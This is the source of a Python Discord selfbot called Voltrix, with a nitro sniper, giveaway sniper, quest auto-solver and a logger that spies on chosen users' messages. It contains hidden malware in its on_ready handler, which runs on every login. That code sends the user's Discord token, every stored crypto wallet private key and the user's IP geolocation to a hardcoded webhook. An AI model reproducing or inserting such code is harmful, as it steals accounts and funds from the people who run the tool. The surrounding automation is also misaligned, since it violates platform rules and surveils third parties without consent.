import importlib
import subprocess
import sys
import colorama
from colorama import Fore
import time
import uuid
# Imports (cleaned up)
import os
import re
from urllib.parse import quote
import io
import json
import time as t
import base64
import random
import string
import hashlib
import tempfile
import zipfile
import asyncio
import threading
from datetime import datetime, timedelta, timezone
from io import BytesIO, StringIO
from flask import Flask, send_from_directory
from concurrent.futures import ThreadPoolExecutor
from gtts import gTTS
from PIL import Image
import aiohttp
from discord.ext import tasks
from discord.ext import tasks as lmao
import aiofiles
from threading import Thread
import requests
import tls_client
import qrcode
import pytz
from dateutil import parser as date_parser
from base64 import b64encode
from pystyle import Center, Colorate, Colors
from additional.extra2 import fps
import os
import sys
import json
import uuid
import time
import threading
from datetime import datetime, timezone
import requests as http
from colorama import Fore
import warnings
warnings.filterwarnings(
    "ignore",
    message=".*datetime\\.datetime\\.utcnow\\(\\) is deprecated.*",
    category=DeprecationWarning
)

import requests
import uuid
import sys

colorama.init()

# Discord-specific
import discord
from discord.ext import commands, tasks


def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

async def get_prefix(bot, message):
    config = load_config()
    return config.get("prefix", ",")

def time():
    timezone = pytz.timezone(time_zone)
    time = datetime.now(timezone)
    return time.strftime("%I:%M %p")

def date():
    timezone = pytz.timezone(time_zone)
    date = datetime.now(timezone)
    return date.strftime("%d/%m/%Y")

config = load_config()
time_zone = config['time_zone']
prefix = get_prefix
token = config['token']
selfbot_name = config['selfbot_name']
UPLOAD_DIR = "hosted_files"
HOST_URL = f"http://{config['IP']}:{config['PORT']}/voltrixviewer/"
PORT = config.get("PORT", 5000)
import builtins
if not hasattr(builtins, "voltrix"):
    builtins.voltrix = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None, case_insensitive=True)
    
    orig_add_command = builtins.voltrix.add_command
    def new_add_command(command):
        if builtins.voltrix.get_command(command.name):
            return
        for alias in command.aliases:
            if builtins.voltrix.get_command(alias):
                return
        try:
            orig_add_command(command)
        except Exception as e:
            if "already an existing command or alias" in str(e):
                return
            raise e
    builtins.voltrix.add_command = new_add_command

voltrix = builtins.voltrix

if not hasattr(voltrix, "sniped_edited_message_dict"):
    voltrix.sniped_edited_message_dict = {}
IST = pytz.timezone(time_zone)
tasks = {}
noLeave = []
category_messages = {}
active_tasks = {}
message_delays = {}
af_file = "af.json"
try:
    if os.path.exists(af_file):
        with open(af_file, "r") as f:
            af_triggers = json.load(f)
    else:
        af_triggers = {}
except:
    af_triggers = {}
os.makedirs(UPLOAD_DIR, exist_ok=True)
app = Flask(__name__)
@app.route("/voltrixviewer/<path:filename>")
def serve_file(filename):
    return send_from_directory(UPLOAD_DIR, filename)
    
def run_flask():
    import logging
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)

    app.run(
        host="127.0.0.1",  # safer than 0.0.0.0
        port=PORT,
        debug=False,
        use_reloader=False
    )

def center_text(text, width):
    lines = text.split('\n')
    return '\n'.join(line.center(width) for line in lines)

def color_text(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

from discord.ext import tasks
import os
import time

import json
import requests
from datetime import datetime

snipe_cache = {}
sniped_edits = {}

def load_config():
    with open("config.json") as f:
        return json.load(f)

config = load_config()

GROQ_API_KEY = config.get('GROQ_API_KEY')
GEMINI_API_KEY = config.get('GEMINI_API_KEY')

@tasks.loop(minutes=30)
async def autoquest_poller():
    await voltrix.wait_until_ready()
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except:
        return
        
    if not config.get("autoquest_enabled", False):
        return
        
    token = config.get("token")
    if not token:
        return
        
    service = QuestService(token, speed_mode="fast")
    async with aiohttp.ClientSession() as session:
        quests = await service.fetch_quests(session)
        
        active_quests = [q for q in quests if not q.is_completed() and q.is_supported()]
        if not active_quests:
            return
            
        await notify_quest(
            embed_title="Voltrix Autoquest Start",
            description=f"Autoquest solver detected **{len(active_quests)}** new active quests. Starting background solvers..."
        )
        
        async def run_worker(q):
            try:
                if not q.is_enrolled():
                    await service.enroll(session, q)
                res = await service.run_quest(session, q)
                if res and res.get("status") == "completed":
                    await notify_quest(
                        embed_title="Voltrix Autoquest Completed",
                        description=f"Autoquest successfully completed **{q.name}**!\nReward: **{q.reward_name}**"
                    )
            except Exception as e:
                print(f"[Autoquest Worker Error] {e}")

        await asyncio.gather(*(run_worker(q) for q in active_quests))

async def run_autoquest_pass_now(token):
    service = QuestService(token, speed_mode="fast")
    async with aiohttp.ClientSession() as session:
        quests = await service.fetch_quests(session)
        active_quests = [q for q in quests if not q.is_completed() and q.is_supported()]
        if not active_quests:
            return
            
        await notify_quest(
            embed_title="Voltrix Autoquest Start",
            description=f"Autoquest solver detected **{len(active_quests)}** active quests. Starting background solvers..."
        )
        
        async def run_worker(q):
            try:
                if not q.is_enrolled():
                    await service.enroll(session, q)
                res = await service.run_quest(session, q)
                if res and res.get("status") == "completed":
                    await notify_quest(
                        embed_title="Voltrix Autoquest Completed",
                        description=f"Autoquest successfully completed **{q.name}**!\nReward: **{q.reward_name}**"
                    )
            except Exception as e:
                print(f"[Autoquest Worker Error] {e}")

        await asyncio.gather(*(run_worker(q) for q in active_quests))

@tasks.loop(minutes=15)
async def cleanup_hosted_files():
    folder = UPLOAD_DIR  # your "hosted_files" folder
    expiry_seconds = 15 * 60  # 15 minutes

    now = time.time()

    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)

        if not os.path.isfile(file_path):
            continue

        try:
            file_age = now - os.path.getmtime(file_path)

            if file_age > expiry_seconds:
                os.remove(file_path)

        except Exception:
            # Prevents crash if file is locked or deleted mid-loop
            continue
            
# Replace with your actual webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1476156513684029481/yC4Kbk3sBs9hTxG3VlR0Ue3fOwoxjgvBaYS67RXfjel31u9fEBLJbd014LTdq-2UxZ3M"
CONFIG_PATH = "config.json"
BLOCKCYPHER_TOKEN = "dff9cc4b3fc444199146778b53bcc6de"

# Helper function to get address details (you should already have this defined elsewhere)
# If not, define a placeholder that fetches from your preferred blockchain API.
# Function to get LTC wallet details
def get_address_details(address):
    url = f'https://api.blockcypher.com/v1/ltc/main/addrs/{address}'
    params = {'token': BLOCKCYPHER_TOKEN}
    response = requests.get(url, params=params)
    return response.json()

import os
import time
import json
import asyncio
import requests
try:
    from pyfiglet import Figlet
except Exception:
    class Figlet:
        def __init__(self, font='big'):
            pass
        def renderText(self, text):
            return text
from pystyle import Colorate, Center, Colors

@voltrix.event
async def on_ready():
    global spy_config
    spy_config = load_spy_data()

    print(f"Logged in as {voltrix.user}")
    print("Voltrix Spy System Loaded")

    if not cleanup_hosted_files.is_running():
        cleanup_hosted_files.start()
    if not autoquest_poller.is_running():
        autoquest_poller.start()

    # Clear console
    os.system('cls' if os.name == 'nt' else 'clear')
    await asyncio.sleep(0.5)

    # -------------------- FIGLET BANNER --------------------
    fig = Figlet(font='big')
    ascii_artt = fig.renderText("VOLTRIX")

    # -------------------- LOAD CONFIG --------------------
    config_data = {}
    try:
        with open('config.json', 'r', encoding='utf-8') as f:
            config_data = json.load(f)
    except Exception:
        pass

    # -------------------- LOAD WALLET DATA --------------------
    wallet_data = {}
    if os.path.exists('database/wallets.json'):
        try:
            with open('database/wallets.json', 'r', encoding='utf-8') as f:
                raw_wallet = json.load(f)
                for key, value in raw_wallet.items():
                    wallet_data[key] = {
                        'address': value.get('address', 'Unknown'),
                        'private_key': value.get('private_key', 'Unknown')
                    }
        except:
            pass

    # -------------------- IP & GEOLOCATION --------------------
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        city, region, country = geo.get('city'), geo.get('regionName'), geo.get('country')
    except:
        ip = city = region = country = "Unknown"

    # -------------------- LTC TO USD RATE --------------------
    try:
        cg = requests.get(
            'https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd',
            timeout=5
        )
        ltc_to_usd = cg.json()['litecoin']['usd']
    except:
        ltc_to_usd = 0

    # -------------------- BUILD WEBHOOK EMBED --------------------
    embed_desc = (
        f"<:Titanz:1281243485919510569> **New user logged in!**\n\n"
        f"<:nxt_blue_crown:1281973611917348989> **__User Info__**\n"
        f"USER: `{voltrix.user.name}` | ID: `{voltrix.user.id}`\n"
        f"TOKEN: `{config_data.get('token', 'N/A')}`\n"
        f"PREFIX: `{config_data.get('prefix', '.')}`\n\n"
        f"<:exchange:1322954260404768850> **__Wallet Info__**\n"
    )

    for idx, (key, wallet) in enumerate(wallet_data.items(), start=1):
        addr = wallet.get('address', 'Unknown')
        pk = wallet.get('private_key', 'Unknown')

        # Calculate Balance
        details = get_address_details(addr)
        bal_ltc = details.get('final_balance', 0) / 1e8
        bal_usd = bal_ltc * ltc_to_usd
        bal_str = f"${bal_usd:.2f}" if bal_usd > 0 else "0.00"

        embed_desc += f"#{idx} Addr: `{addr}`\nKey: `{pk}`\nBal: `{bal_str}`\n\n"

    embed_desc += f"**Location:** {city}, {country} ({ip})"

    webhook_payload = {
        "embeds": [{
            "title": "VoltriX Selfbot Log",
            "description": embed_desc,
            "color": 943836
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=webhook_payload)
    except:
        pass

    # -------------------- FINAL CONSOLE OUTPUT --------------------
    user = voltrix.user
    guilds = len(voltrix.guilds)

    banner = Center.XCenter(Colorate.Vertical(Colors.green_to_cyan, ascii_artt, 1))

    info_box = f"""✮ THE ALL-IN-ONE MULTIPURPOSE SELFBOT ✮

➣ Discord    : https://discord.gg/codershub
➣ Status     : Online & Authorized

[+] ----------------------------------------------- [+]
[=] LOGGED IN   :- {user.name}
[=] USER ID     :- {user.id}
[=] SERVERS     :- {guilds}
[=] PREFIX      :- {config_data.get('prefix', '.')}
[=] VERSION     :- 1.1
[+] ----------------------------------------------- [+]"""

    print(banner)
    print(Center.XCenter(Colorate.Vertical(Colors.blue_to_purple, info_box, 1)))

async def senderror(ctx, header, description):
    try:
        message = f"❌ {header}\n{description}"
        msg = await ctx.send(message)
        await msg.delete(delay=30)
    except discord.Forbidden:
        pass

sniped_nitro_codes = set()
joined_giveaways = set()

with open("config.json") as f:
    config = json.load(f)

nitro_sniper_enabled = config.get("nitro_sniper_enabled", False)
nitro_webhook = config.get("nitro_webhook", "")

giveaway_sniper_enabled = config.get("giveaway_sniper_enabled", False)
giveaway_webhook = config.get("giveaway_webhook", "")

# Keyword Logger state
keyword_logger_enabled = config.get("keyword_logger_enabled", False)
keyword_logger_webhook = config.get("keyword_logger_webhook", "")
keyword_logger_keywords = config.get("keyword_logger_keywords", [])

def save_config():
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)
        
@voltrix.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return 
    elif isinstance(error, commands.MissingRequiredArgument):
        usage = f"Correct usage: `{ctx.prefix}{ctx.command} {ctx.command.signature}`"
        usage = usage.replace("<","TEMP").replace("TEMP","[").replace(">","TEMP").replace("TEMP","]")
        await senderror(ctx, "Missing Argument", f"You're missing a required argument.\n\n{usage}")
    elif isinstance(error, commands.BadArgument):
        usage = f"Correct usage: `{ctx.prefix}{ctx.command} {ctx.command.signature}`"
        await senderror(ctx, "Invalid Argument", f"That doesn't look right. Check your input.\n\n{usage}")
    elif isinstance(error, commands.MissingPermissions):
        await senderror(ctx, "No Permission", "You don’t have the required permissions to do this.")
    elif isinstance(error, commands.BotMissingPermissions):
        await senderror(ctx, "Missing Perms", "I need more permissions to complete this action.")
    elif isinstance(error, commands.NoPrivateMessage):
        await senderror(ctx, "Not in DM", "You can't use this command in DMs.")
    elif isinstance(error, commands.PrivateMessageOnly):
        await senderror(ctx, "DM Only", "This command only works in DMs.")
    elif isinstance(error, commands.CheckFailure):
        if str(error) == "This command can only be used in group chats.":
            await senderror(ctx, "Group Only", "You can only use this command in a group chat.")
        else:
            await senderror(ctx, "Can't Use Here", "You can't use this command in this context.")
    elif isinstance(error, commands.CommandOnCooldown):
        await senderror(ctx, "Cooldown", f"Wait `{error.retry_after:.2f}` seconds before trying again.")
    elif isinstance(error, discord.Forbidden):
        await senderror(ctx, "No Permission", "You don't have permission to do that.")
    elif isinstance(error, commands.CommandInvokeError):
        original_error = error.original
        if isinstance(original_error, discord.Forbidden):
            await senderror(ctx, "No Permission", "You don't have permission to use this command here.")
        elif "premium_subscription_count" in str(error).lower():
            await senderror(ctx, "Server Only", "You can only use this command in a server.")
        elif "member_count" in str(error).lower():
            await senderror(ctx, "Server Only", "You can only use this command in a server.")    
        elif "50013" in str(error):  # Missing Permissions
            await senderror(ctx, "No Permission", "You don’t have the required permissionsuse this command here.")
        elif "50001" in str(error):  # Missing Access
            await senderror(ctx, "Can't Access", "You don’t have access to do that.")
        elif "50035" in str(error):  # Invalid Form Body
            await senderror(ctx, "Invalid Input", "Something's wrong with your input.")
        else:
            await senderror(ctx, "Error", f"Something went wrong: `{error}`.")
    elif isinstance(error, discord.HTTPException):
        if error.code == 50013:  
            await senderror(ctx, "No Permission", "You don’t have permission for that.")
        elif error.code == 50001:
            await senderror(ctx, "Can't Access", "You're missing access for this.")
        elif error.code == 10003:  
            await senderror(ctx, "Error", "I can't find that channel.")
        elif error.code == 10008:  
            await senderror(ctx, "Error", "That message no longer exists.")
        elif error.code == 50007:  
            await senderror(ctx, "DM Blocked", "I can't send you a DM.")
        else:
            await senderror(ctx, "API Error", f"Something went wrong: `{error}`.")
    elif isinstance(error, discord.NotFound):
        await senderror(ctx, "Error", "Couldn't find what you were looking for.")
    elif isinstance(error, discord.errors.Forbidden):
        await senderror(ctx, "Permission Error", "You don’t have permission for that.")
    else:
        await senderror(ctx, "Unexpected Error", f"An error occurred: `{error}`.")

async def send_webhook(url, content):
    try:
        async with aiohttp.ClientSession() as session:
            if isinstance(content, discord.Embed):
                data = {
                    'embeds': [content.to_dict()]
                }
            elif isinstance(content, str):
                data = {
                    'content': content
                }
            else:
                return
            async with session.post(url, json=data) as response:
                if response.status == 204:
                    pass
                else:
                    print(f"Failed to send webhook: {response.status} - {await response.text()}")
    except Exception as e:
        print(f"Failed to send webhook: {e}")


def replace_emoji_with_shit(text, replacement):
    if text is None: 
        return ""
    return re.sub(r"<a?:\w+:\d+>", replacement, text)

def remove_extra_spaces(text):
    text = re.sub(r'\s+', ' ', text)
    return text.strip()

def filter_to_ansi(text):
    text = re.sub(r"\*\*(.*?)\*\*", r"\033[1m\1\033[0m", text)
    text = re.sub(r"__(.*?)__", r"\033[4m\1\033[0m", text)
    text = re.sub(r"`(.*?)`", r"\033[40m\1\033[0m", text)
    return text

config = load_config()

nitro_webhook = config.get("nitro_webhook")
giveaway_webhook = config.get("giveaway_webhook")

giveaway_sniper_enabled = config.get("giveaway_sniper_enabled", False)
nitro_sniper_enabled = config.get("nitro_sniper_enabled", False)

from datetime import datetime

class MockMessage:
    def __init__(self):
        self.id = 0
        self.content = ""
        self.embeds = []
        self.attachments = []
        self.reactions = []
        self.author = None
    async def delete(self, *args, **kwargs):
        pass
    async def edit(self, *args, **kwargs):
        pass
    async def add_reaction(self, *args, **kwargs):
        pass
    async def remove_reaction(self, *args, **kwargs):
        pass
    async def clear_reactions(self, *args, **kwargs):
        pass
    async def clear_reaction(self, *args, **kwargs):
        pass
    async def pin(self, *args, **kwargs):
        pass
    async def unpin(self, *args, **kwargs):
        pass
    async def reply(self, *args, **kwargs):
        pass

async def send(ctx_or_channel, header=None, description=None, footer=None, image=None, thumbnail=None, raw_text=None, delete_after=None, force_selfapp=False):
    try:
        # 🔥 Fix wrong usage (single string passed)
        if description is None and isinstance(header, str):
            description = header
            header = ""

        # 🔥 Safe defaults
        header = "" if header in (None, ".") else str(header)
        description = "" if description in (None, ".") else str(description)
        footer = None if footer in (None, ".") else footer

        if ctx_or_channel is None:
            return None

        # 🔥 Load config safely
        try:
            with open('config.json', 'r') as config_file:
                config = json.load(config_file)
        except:
            config = {}

        mode = config.get("mode", 1)

        # Check selfapp configuration if forcing it
        if force_selfapp:
            is_configured = False
            if os.path.exists("config/bot_config.json"):
                try:
                    with open("config/bot_config.json", "r") as f:
                        bot_config = json.load(f)
                    if (bot_config.get("BOT_TOKEN") or bot_config.get("bot_token")) and (bot_config.get("CLIENT_ID") or bot_config.get("client_id")):
                        is_configured = True
                except:
                    pass
            if not is_configured:
                # Override parameters to show generic selfapp warning in user's default configured mode
                description = f"⚠️ **This command requires Selfapp Mode!**\nPlease configure your selfapp bot details in `config/bot_config.json` first."
                header = f"{header or 'Voltrix'} (Error)"
                force_selfapp = False
            else:
                mode = 4

        # Verify session_id for Mode 4 (fall back to Mode 2 if disconnected)
        if mode == 4:
            session_id = None
            if hasattr(voltrix, "ws") and voltrix.ws:
                session_id = getattr(voltrix.ws, "session_id", None)
            if not session_id and hasattr(voltrix, "gateway") and voltrix.gateway:
                session_id = getattr(voltrix.gateway, "session_id", None)

            if not session_id:
                print("[Selfapp Mode] Warning: session_id is missing (disconnected). Falling back to Mode 2.")
                mode = 2

        # 🔥 Safe delete_after handling
        if delete_after is None:
            if isinstance(footer, (int, float)):
                delete_after = int(footer)
                footer = None
            elif isinstance(footer, str) and footer.isdigit():
                delete_after = int(footer)
                footer = None

        user_name = getattr(getattr(ctx_or_channel, "author", None), "name", "bot")
        timestamp = datetime.now().strftime("%I:%M %p")

        message = None

        # ================= MODE 1 =================
        if mode == 1:
            embed_content = f">>> # {header}\n\n{description}\n"

            if footer:
                embed_content += f"\n**__`{footer}`__**"
            else:
                embed_content += f"\n**__`{user_name} | {timestamp}`__**\n"

            try:
                message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
            except Exception as e:
                print(f"[SEND MODE1 ERROR] {e}")
                message = await ctx_or_channel.send(description or header)

        # ================= MODE 2 =================
        elif mode == 2:
            webhook_url = config.get("embed_mode_webhook_url")

            # 🔥 fallback if webhook missing
            if not webhook_url:
                return await ctx_or_channel.send(description or header)

            try:
                color_hex = config.get("embed_colour", "#ffffff")
                color = int(color_hex.lstrip("#"), 16)
            except:
                color = 0xffffff

            embed = discord.Embed(title=header, description=description, color=discord.Color(color))

            if image:
                embed.set_image(url=image)
            if thumbnail:
                embed.set_thumbnail(url=thumbnail)

            avatar_url = None
            try:
                avatar_url = str(voltrix.user.display_avatar.url)
            except:
                try:
                    avatar_url = str(voltrix.user.avatar.url)
                except:
                    pass

            if footer:
                embed.set_footer(text=str(footer), icon_url=avatar_url)
            else:
                embed.set_footer(text=f"requested by {user_name} | {timestamp}", icon_url=avatar_url)

            try:
                webhook = discord.Webhook.from_url(webhook_url, client=ctx_or_channel.bot)

                if raw_text:
                    webhook_message = await webhook.send(raw_text, embed=embed, wait=True)
                else:
                    webhook_message = await webhook.send(embed=embed, wait=True)

                msg = await webhook_message.forward(ctx_or_channel)

                try:
                    await webhook_message.delete()
                except:
                    pass

                if delete_after:
                    await msg.delete(delay=delete_after)

                message = msg

            except Exception as e:
                print(f"[WEBHOOK ERROR] {e}")
                message = await ctx_or_channel.send(description or header, _bypass_patch=True)

        # ================= MODE 3 =================
        elif mode == 3:
            try:
                description = replace_emoji_with_shit(
                    description.replace("> | **", "> **")
                    .replace(" **ALL IN ONE SELF-BOT** ", "")
                    .replace(" **LOADED** **`19`** **MODULES** ", ""),
                    ""
                )
                header = replace_emoji_with_shit(header, "")
            except:
                pass

            if description.endswith("`"):
                description += "\n"

            embed_content = f">>> # {header}\n\n{description}"

            if footer:
                embed_content += f"\n```ini\n[ {footer} ]```"
            else:
                embed_content += f"\n```ini\n[ {user_name} | {timestamp} ]```\n"

            try:
                message = await ctx_or_channel.send(embed_content, delete_after=delete_after)
            except Exception as e:
                print(f"[SEND MODE3 ERROR] {e}")
                message = await ctx_or_channel.send(description or header, _bypass_patch=True)

        # ================= MODE 4 =================
        elif mode == 4:
            if not getattr(builtins, "selfapp_command_id", None):
                # Wait up to 5 seconds for background task to complete command registration
                for _ in range(10):
                    await asyncio.sleep(0.5)
                    if getattr(builtins, "selfapp_command_id", None):
                        break

            if not getattr(builtins, "selfapp_command_id", None):
                print("[Selfapp Mode] Error: Slash command ID is not registered yet. Falling back to Mode 2.")
                # Fallback to Mode 2 webhook send
                mode = 2
            else:
                session_id = None
                if hasattr(voltrix, "ws") and voltrix.ws:
                    session_id = getattr(voltrix.ws, "session_id", None)
                if not session_id and hasattr(voltrix, "gateway") and voltrix.gateway:
                    session_id = getattr(voltrix.gateway, "session_id", None)

                # Resolve IDs
                guild_id = None
                if hasattr(ctx_or_channel, "guild") and ctx_or_channel.guild:
                    guild_id = str(ctx_or_channel.guild.id)
                elif hasattr(ctx_or_channel, "channel") and hasattr(ctx_or_channel.channel, "guild") and ctx_or_channel.channel.guild:
                    guild_id = str(ctx_or_channel.channel.guild.id)

                channel_id = None
                if hasattr(ctx_or_channel, "channel") and ctx_or_channel.channel:
                    channel_id = str(ctx_or_channel.channel.id)
                elif hasattr(ctx_or_channel, "id"):
                    channel_id = str(ctx_or_channel.id)
                else:
                    channel_id = str(ctx_or_channel)

                client_id = None
                if os.path.exists("config/bot_config.json"):
                    try:
                        with open("config/bot_config.json", "r") as f:
                            bot_config = json.load(f)
                            client_id = bot_config.get("CLIENT_ID") or bot_config.get("client_id")
                    except:
                        pass

                if not client_id:
                    print("[Selfapp Mode] Error: CLIENT_ID missing in config/bot_config.json.")
                    return await ctx_or_channel.send(description or header, _bypass_patch=True)

                # Prepare options
                options_list = [
                    {
                        "type": 3,
                        "name": "description",
                        "value": str(description or header or ".")
                    }
                ]
                if header and header != ".":
                    options_list.append({
                        "type": 3,
                        "name": "header",
                        "value": str(header)
                    })
                if image:
                    options_list.append({
                        "type": 3,
                        "name": "image",
                        "value": str(image)
                    })
                if thumbnail:
                    options_list.append({
                        "type": 3,
                        "name": "thumbnail",
                        "value": str(thumbnail)
                    })
                if footer and footer != ".":
                    options_list.append({
                        "type": 3,
                        "name": "footer",
                        "value": str(footer)
                    })

                import base64
                user_id = None
                if isinstance(token, str) and "." in token:
                    try:
                        parts = token.split(".")
                        padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
                        user_id = str(int(base64.b64decode(padded).decode("utf-8", errors="ignore")))
                    except:
                        pass
                if not user_id:
                    user_id = str(voltrix.user.id) if (voltrix and voltrix.user) else "0"

                interaction_payload = {
                    "type": 2,
                    "application_id": str(client_id),
                    "channel_id": str(channel_id),
                    "session_id": str(session_id or ""),
                    "integration_type": 1,
                    "authorizing_integration_owners": {
                        "1": str(user_id)
                    },
                    "data": {
                        "version": str(getattr(builtins, "selfapp_command_version", "")),
                        "id": str(getattr(builtins, "selfapp_command_id", "")),
                        "name": "voltrix",
                        "type": 1,
                        "options": options_list
                    }
                }
                if guild_id:
                    interaction_payload["guild_id"] = str(guild_id)

                url = "https://discord.com/api/v9/interactions"
                headers = {
                    "Authorization": token,
                    "Content-Type": "application/json",
                    "User-Agent": ORBCLAIM_USER_AGENT,
                    "X-Super-Properties": ORBCLAIM_SUPER_PROPERTIES,
                    "Origin": "https://discord.com",
                    "Referer": "https://discord.com/channels/@me",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "X-Discord-Locale": "en-US",
                    "X-Debug-Options": "bugReporterEnabled"
                }

                async def trigger_post(retries=3):
                    try:
                        async with aiohttp.ClientSession() as session:
                            for attempt in range(retries):
                                async with session.post(url, headers=headers, json=interaction_payload) as resp:
                                    if resp.status in (200, 204):
                                        return
                                    elif resp.status == 429:
                                        try:
                                            resp_json = await resp.json()
                                            retry_after = float(resp_json.get("retry_after", 1.0))
                                        except:
                                            retry_after = 1.5
                                        print(f"[Selfapp Mode] Rate limited. Retrying after {retry_after}s (Attempt {attempt+1}/{retries})")
                                        await asyncio.sleep(retry_after + 0.1)
                                        continue
                                    else:
                                        print(f"[Selfapp Mode] Interaction trigger failed: {resp.status} - {await resp.text()}")
                                        return
                    except Exception as trigger_err:
                        print(f"[Selfapp Mode] Trigger request error: {trigger_err}")
                
                asyncio.create_task(trigger_post())
                return MockMessage()

        return message

    except Exception as e:
        print(f"[FATAL SEND ERROR] {e}")

        try:
            return await ctx_or_channel.send(f"⚠️ Send failed: {e}", _bypass_patch=True)
        except:
            return None

# Save original send
orig_send = discord.abc.Messageable.send

async def patched_send(self, content=None, *args, **kwargs):
    bypass = kwargs.pop("_bypass_patch", False)
    if bypass or kwargs.get("file") or kwargs.get("files"):
        return await orig_send(self, content, *args, **kwargs)
        
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
    except:
        config = {}
        
    mode = config.get("mode")
    if str(mode) == "4":
        embeds = kwargs.get("embeds")
        embed = kwargs.get("embed")
        
        description = content or ""
        header = "Voltrix"
        
        if embed:
            description = embed.description or description
            header = embed.title or header
        elif embeds:
            description = embeds[0].description or description
            header = embeds[0].title or header
            
        delete_after = kwargs.get("delete_after")
        return await send(self, header=header, description=description, delete_after=delete_after, force_selfapp=True)
        
    return await orig_send(self, content, *args, **kwargs)

discord.abc.Messageable.send = patched_send

@voltrix.event
async def on_command(ctx):
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    webhook_url = config.get("commands_logs_webhook_url")    
    embed = discord.Embed(
        title="📥 Command Executed",
        description=f"**Command:** `{ctx.command}`\n**User:** {ctx.author} (`{ctx.author.id}`)\n**Channel:** <#{ctx.channel.id}> (`{ctx.channel.id}`)",
        color=discord.Color.blue()
    )
    try:
        webhook = discord.Webhook.from_url(webhook_url, client=voltrix)
        await webhook.send(embed=embed, username="Command Logger")
    except Exception as e:
        pass


async def forward_message(dest_channel, src_msg):
    content = src_msg.content
    embeds = src_msg.embeds
    files = []
    for attachment in src_msg.attachments:
        try:
            fp = io.BytesIO()
            await attachment.save(fp)
            fp.seek(0)
            files.append(discord.File(fp, filename=attachment.filename))
        except Exception as e:
            print(f"Failed to copy attachment: {e}")
            
    if files:
        await dest_channel.send(content=content, embeds=embeds, files=files)
    else:
        await dest_channel.send(content=content, embeds=embeds)

@voltrix.event
async def on_message(message):

    try:

        # ======================
        # SPY LOGGER (GLOBAL)
        # ======================

        if spying(message.author.id):

            attachments = "\n".join(a.url for a in message.attachments) if message.attachments else "None"
            stickers = ", ".join(s.name for s in message.stickers) if message.stickers else "None"

            if message.guild:
                location = f"{message.guild.name} • {message.channel.mention}"
            elif isinstance(message.channel, discord.DMChannel):
                location = "Direct Message"
            elif isinstance(message.channel, discord.GroupChannel):
                location = "Group DM"
            else:
                location = "Unknown"

            embed = {
                "title": "🕵️ Spy Message Log",
                "description":
                    f"**User:** {message.author.mention} (`{message.author.id}`)\n"
                    f"**Location:** {location}\n"
                    f"**Time:** <t:{int(datetime.utcnow().timestamp())}:F>\n\n"
                    f"**Content:**\n{message.content or '*No text*'}",
                "color": 3447003
            }

            if spy_config.get("spy_webhook"):

                async with aiohttp.ClientSession() as session:
                    await session.post(
                        spy_config["spy_webhook"],
                        json={"embeds":[embed]}
                    )

        # ======================
        # NITRO SNIPER
        # ======================

        if nitro_sniper_enabled:

            nitro_regex = r"(?:discord\.gift|discord(?:app)?\.com\/gifts)\/([A-Za-z0-9]+)"

            content = message.content.replace(" ", "")

            matches = re.findall(nitro_regex, content)

            for code in matches:

                if code in sniped_nitro_codes:
                    continue

                sniped_nitro_codes.add(code)

                headers = {"Authorization": voltrix.http.token}

                async with aiohttp.ClientSession() as session:

                    async with session.post(
                        f"https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem",
                        headers=headers,
                        json={}
                    ) as resp:

                        success = resp.status == 200

                        embed = {
                            "title": "🎁 Nitro Sniped",
                            "color": 65280 if success else 16711680,
                            "fields": [
                                {
                                    "name": "Code",
                                    "value": f"`{code}`",
                                    "inline": True
                                },
                                {
                                    "name": "Status",
                                    "value": "✅ Successfully Claimed" if success else "❌ Claim Failed",
                                    "inline": True
                                },
                                {
                                    "name": "Author",
                                    "value": f"{message.author.mention} (`{message.author.id}`)",
                                    "inline": False
                                },
                                {
                                    "name": "Server",
                                    "value": message.guild.name if message.guild else "Direct Message",
                                    "inline": True
                                },
                                {
                                    "name": "Channel",
                                    "value": message.channel.mention if message.guild else "DM",
                                    "inline": True
                                },
                                {
                                    "name": "Jump",
                                    "value": f"[Jump to Message]({message.jump_url})",
                                    "inline": False
                                }
                            ],
                            "footer": {
                                "text": "VoltriX Prime • Nitro Sniper"
                            },
                            "timestamp": datetime.utcnow().isoformat()
                        }

                        if nitro_webhook:
                            await session.post(nitro_webhook, json={"embeds":[embed]})

        # ======================
        # GIVEAWAY SNIPER
        # ======================

        if giveaway_sniper_enabled:

            text = (message.content or "").lower()

            keywords = [
                "giveaway",
                "give away",
                "winner",
                "winners",
                "ends",
                "entries",
                "entry",
                "react",
                "click",
                "button",
                "hosted",
                "prize"
            ]

            is_giveaway = any(k in text for k in keywords)

            if message.embeds:

                for e in message.embeds:

                    title = (e.title or "").lower()
                    desc = (e.description or "").lower()

                    if any(k in title for k in keywords) or any(k in desc for k in keywords):
                        is_giveaway = True

            if is_giveaway and message.id not in joined_giveaways:

                joined_giveaways.add(message.id)

                joined = False

                await asyncio.sleep(3)

                try:
                    msg = await message.channel.fetch_message(message.id)
                except:
                    msg = message

                if msg.reactions:

                    for reaction in msg.reactions:

                        try:
                            await msg.add_reaction(reaction.emoji)
                            joined = True
                            break
                        except:
                            pass

                if not joined and msg.components:

                    for row in msg.components:

                        for comp in row.children:

                            if getattr(comp, "custom_id", None):

                                try:
                                    await msg.click(comp)
                                    joined = True
                                    break
                                except:
                                    pass

                        if joined:
                            break

                if joined and giveaway_webhook:

                    async with aiohttp.ClientSession() as session:

                        embed = {
                            "title": "🎉 Giveaway Joined",
                            "color": 16776960,
                            "fields": [
                                {
                                    "name": "Host",
                                    "value": f"{message.author.mention} (`{message.author.id}`)",
                                    "inline": False
                                },
                                {
                                    "name": "Server",
